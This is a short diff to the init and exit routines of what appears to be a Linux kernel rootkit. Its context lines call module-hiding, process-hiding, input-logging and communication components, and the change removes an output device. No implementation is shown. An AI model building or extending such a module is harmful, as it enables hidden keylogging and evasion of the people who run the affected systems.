@@ -27,10 +27,6 @@ static int __init main_init(void) {
 	if (error) return error;
 
 
-	//TODO: eventually remove output device
-   error = outputDevice_init();
-   if (error) return error;
-
 #ifndef DEV_MODE
 	error = moduleHide_start();
 	if (error) return error;
@@ -57,7 +53,6 @@ static void __exit main_exit(void) {
    moduleHide_stop();
 	logInput_exit();
 #endif
- 	outputDevice_exit();
 	processHider_exit();
 
 	communication_exit();
